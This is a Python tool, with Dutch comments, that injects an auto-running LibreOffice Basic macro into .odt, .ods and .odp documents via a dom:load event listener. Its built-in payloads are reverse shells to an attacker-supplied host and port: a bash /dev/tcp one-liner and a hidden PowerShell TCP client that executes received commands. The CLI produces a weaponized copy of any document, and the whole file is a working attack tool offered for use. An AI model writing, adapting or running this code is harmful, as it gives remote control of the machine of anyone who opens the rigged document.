#!/usr/bin/env python3
"""ODF macro injectie — .odt / .ods / .odp

Injecteert een LibreOffice Basic macro in een ODF document (ZIP-gebaseerd).
De macro wordt automatisch uitgevoerd bij document openen (dom:load event).

Gebruik:
    python3 odf_inject.py presentatie.odp --lhost 10.0.0.1 --lport 443
    python3 odf_inject.py rapport.odt --source "Sub Main() ... End Sub" -o kwaad.odt

Als module:
    from odf_inject import inject_odf_macro, detect_odf_type
"""

import argparse
import os
import re
import zipfile

# ---------------------------------------------------------------------------
# A. Document type detectie
# ---------------------------------------------------------------------------

_TYPE_MAP = {
    '.odt': 'writer',
    '.ods': 'calc',
    '.odp': 'impress',
}

# Body-element per document type (eerste kind van <office:body>)
_BODY_TAG = {
    'writer':  'office:text',
    'calc':    'office:spreadsheet',
    'impress': 'office:presentation',
}


def detect_odf_type(path: str) -> str:
    """Detecteer ODF document type op basis van extensie.

    Returns: 'writer', 'calc' of 'impress'
    Raises: ValueError als extensie niet ondersteund is
    """
    ext = os.path.splitext(path)[1].lower()
    if ext not in _TYPE_MAP:
        raise ValueError(f"Niet-ondersteunde ODF extensie: {ext}. Gebruik .odt, .ods of .odp")
    return _TYPE_MAP[ext]


# ---------------------------------------------------------------------------
# B. LibreOffice Basic XML bestanden
# ---------------------------------------------------------------------------

_SCRIPT_LC = """\
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE library:libraries PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "libraries.dtd">
<library:libraries xmlns:library="http://openoffice.org/2000/library" xmlns:xlink="http://www.w3.org/1999/xlink">
 <library:library library:name="Standard" xlink:href="Standard/script-lb.xml" xlink:type="simple" library:link="false"/>
</library:libraries>
"""

_SCRIPT_LB = """\
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE library:library PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "library.dtd">
<library:library xmlns:library="http://openoffice.org/2000/library" xmlns:xlink="http://www.w3.org/1999/xlink" library:name="Standard" library:readonly="false" library:passwordprotected="false">
 <library:element library:name="Module1"/>
</library:library>
"""


def _module_xml(basic_source: str) -> str:
    """Bouw Module1.xml met de LibreOffice Basic broncode."""
    # Escape CDATA-eindsequentie indien aanwezig in de broncode
    safe = basic_source.replace(']]>', ']]]]><![CDATA[>')
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">\n'
        '<script:module xmlns:script="http://openoffice.org/2000/script"'
        ' script:name="Module1" script:language="StarBasic" script:moduleType="normal">'
        '<![CDATA[\n' + safe + '\n]]></script:module>'
    )


# ---------------------------------------------------------------------------
# C. Manifest en content.xml modificatie
# ---------------------------------------------------------------------------

_MANIFEST_ENTRIES = (
    ' <manifest:file-entry manifest:full-path="Basic/" manifest:media-type=""/>\n'
    ' <manifest:file-entry manifest:full-path="Basic/script-lc.xml" manifest:media-type=""/>\n'
    ' <manifest:file-entry manifest:full-path="Basic/Standard/"'
    ' manifest:media-type="application/vnd.sun.star.basic-library"/>\n'
    ' <manifest:file-entry manifest:full-path="Basic/Standard/Module1.xml" manifest:media-type=""/>\n'
    ' <manifest:file-entry manifest:full-path="Basic/Standard/script-lb.xml" manifest:media-type=""/>\n'
)

# Event listener die Main() aanroept bij document openen
_EVENT_LISTENER = (
    '<office:event-listeners>'
    '<script:event-listener'
    ' script:language="ooo:script"'
    ' script:event-name="dom:load"'
    ' xlink:href="vnd.sun.star.script:Standard.Module1.Main?language=Basic&amp;location=document"'
    ' xlink:type="simple"/>'
    '</office:event-listeners>'
)

_SCRIPT_NS_DECL = 'xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0"'
_XLINK_NS_DECL  = 'xmlns:xlink="http://www.w3.org/1999/xlink"'


def _update_manifest(xml: str) -> str:
    """Voeg Basic-library entries toe aan META-INF/manifest.xml."""
    if 'Basic/script-lc.xml' in xml:
        return xml  # Al aanwezig, niet opnieuw injecteren
    return xml.replace('</manifest:manifest>', _MANIFEST_ENTRIES + '</manifest:manifest>')


def _inject_event(xml: str, doc_type: str) -> str:
    """Voeg dom:load event listener toe aan het body-element in content.xml."""
    if 'office:event-listeners' in xml:
        return xml  # Al aanwezig

    # Zorg dat script: en xlink: namespaces gedeclareerd zijn in het root-element
    root_match = re.search(r'(<office:document-content)([^>]*)(>)', xml)
    if root_match:
        prefix, attrs, suffix = root_match.group(1), root_match.group(2), root_match.group(3)
        additions = ''
        if 'xmlns:script' not in attrs:
            additions += ' ' + _SCRIPT_NS_DECL
        if 'xmlns:xlink' not in attrs:
            additions += ' ' + _XLINK_NS_DECL
        if additions:
            xml = xml.replace(
                root_match.group(0),
                f'{prefix}{attrs}{additions}{suffix}',
                1,
            )

    # Injecteer event listener direct na de opening body-tag
    tag = _BODY_TAG[doc_type]
    pattern = rf'(<{re.escape(tag)}(?:\s[^>]*)?>)'
    result = re.sub(pattern, r'\1' + _EVENT_LISTENER, xml, count=1)
    if result == xml:
        # Body-tag niet gevonden — probeer zonder namespace prefix als fallback
        short = tag.split(':')[1]
        pattern2 = rf'(<[a-z]+:{re.escape(short)}(?:\s[^>]*)?>)'
        result = re.sub(pattern2, r'\1' + _EVENT_LISTENER, xml, count=1)
    return result


# ---------------------------------------------------------------------------
# D. Standaard payloads
# ---------------------------------------------------------------------------

_PAYLOAD_LINUX = """\
Sub Main()
    ' Linux reverse shell via bash
    Dim sHost As String
    Dim sPort As String
    sHost = "LHOST"
    sPort = "LPORT"
    Shell "/bin/bash", 1, "-c 'nohup bash -i >& /dev/tcp/" & sHost & "/" & sPort & " 0>&1 &'", False
End Sub
"""

_PAYLOAD_WINDOWS = """\
Sub Main()
    ' Windows reverse shell via PowerShell
    Dim sCmd As String
    sCmd = "powershell -w hidden -nop -c ""$c=New-Object Net.Sockets.TCPClient('LHOST',LPORT);" & _
           "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0)" & _
           "{$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);" & _
           "$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';" & _
           "$q=[text.encoding]::ASCII.GetBytes($r2);$s.Write($q,0,$q.Length)}" & Chr(34)
    Shell "cmd", 1, "/c " & sCmd, False
End Sub
"""

_PAYLOAD_CROSS = """\
Sub Main()
    ' Cross-platform reverse shell
    Dim sHost As String
    Dim sPort As String
    sHost = "LHOST"
    sPort = "LPORT"
#If Win32 Or Win64 Then
    ' Windows: PowerShell
    Dim sCmd As String
    sCmd = "powershell -w hidden -nop -c ""$c=New-Object Net.Sockets.TCPClient('" & sHost & "'," & sPort & ");" & _
           "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0)" & _
           "{$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);" & _
           "$r=(iex $d 2>&1|Out-String);$q=[text.encoding]::ASCII.GetBytes($r+'PS> ');" & _
           "$s.Write($q,0,$q.Length)}" & Chr(34)
    Shell "cmd", 1, "/c " & sCmd, False
#Else
    ' Linux/macOS: bash
    Shell "/bin/bash", 1, "-c 'nohup bash -i >& /dev/tcp/" & sHost & "/" & sPort & " 0>&1 &'", False
#End If
End Sub
"""


def _build_payload(template: str, lhost: str, lport: str) -> str:
    return template.replace('LHOST', lhost).replace('LPORT', lport)


# ---------------------------------------------------------------------------
# E. Hoofdfunctie (ook als module bruikbaar)
# ---------------------------------------------------------------------------

def inject_odf_macro(input_path: str, basic_source: str, output_path: str = None) -> str:
    """Injecteer een LibreOffice Basic macro in een ODF document.

    Args:
        input_path:   Pad naar .odt, .ods of .odp bronbestand
        basic_source: LibreOffice Basic broncode (inclusief Sub Main() ... End Sub)
        output_path:  Output pad. Als None: <naam>_macro.<ext>

    Returns:
        Het pad naar het output bestand
    """
    doc_type = detect_odf_type(input_path)

    if output_path is None:
        base, ext = os.path.splitext(input_path)
        output_path = base + '_macro' + ext

    module = _module_xml(basic_source)

    with zipfile.ZipFile(input_path, 'r') as zin:
        with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zout:
            for item in zin.infolist():
                data = zin.read(item.filename)

                if item.filename == 'META-INF/manifest.xml':
                    data = _update_manifest(data.decode('utf-8')).encode('utf-8')
                elif item.filename == 'content.xml':
                    data = _inject_event(data.decode('utf-8'), doc_type).encode('utf-8')

                zout.writestr(item, data)

            # Voeg LibreOffice Basic library toe
            zout.writestr('Basic/script-lc.xml',          _SCRIPT_LC.encode('utf-8'))
            zout.writestr('Basic/Standard/script-lb.xml', _SCRIPT_LB.encode('utf-8'))
            zout.writestr('Basic/Standard/Module1.xml',   module.encode('utf-8'))

    return output_path


# ---------------------------------------------------------------------------
# F. CLI
# ---------------------------------------------------------------------------

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='Injecteer een LibreOffice Basic macro in een ODF document (.odt/.ods/.odp).',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Voorbeelden:
  python3 odf_inject.py rapport.odt --lhost 10.0.0.1 --lport 443
  python3 odf_inject.py sheet.ods --lhost 10.0.0.1 --lport 443 --platform windows
  python3 odf_inject.py pres.odp --source "Sub Main() Shell \\"/bin/bash\\" End Sub" -o payload.odp
""",
    )
    parser.add_argument('input',       help='Bronbestand (.odt, .ods of .odp)')
    parser.add_argument('-o', '--output', help='Output pad (standaard: <naam>_macro.<ext>)')
    parser.add_argument('--lhost',     default='127.0.0.1', help='Listener IP (default: 127.0.0.1)')
    parser.add_argument('--lport',     default='443',       help='Listener poort (default: 443)')
    parser.add_argument('--platform',  choices=['linux', 'windows', 'cross'], default='cross',
                        help='Doelplatform voor de reverse shell payload (default: cross)')
    parser.add_argument('--source',    help='Aangepaste LibreOffice Basic broncode (overschrijft --platform)')
    args = parser.parse_args()

    if args.source:
        basic = args.source
    else:
        template_map = {
            'linux':   _PAYLOAD_LINUX,
            'windows': _PAYLOAD_WINDOWS,
            'cross':   _PAYLOAD_CROSS,
        }
        basic = _build_payload(template_map[args.platform], args.lhost, args.lport)

    try:
        out = inject_odf_macro(args.input, basic, args.output)
        print(f'[+] Macro geïnjecteerd in: {out}')
        print(f'[+] Trigger: Sub Main() via dom:load (document openen)')
        print(f'[+] Listener: {args.lhost}:{args.lport}')
    except (ValueError, zipfile.BadZipFile) as e:
        print(f'[!] Fout: {e}')
        raise SystemExit(1)
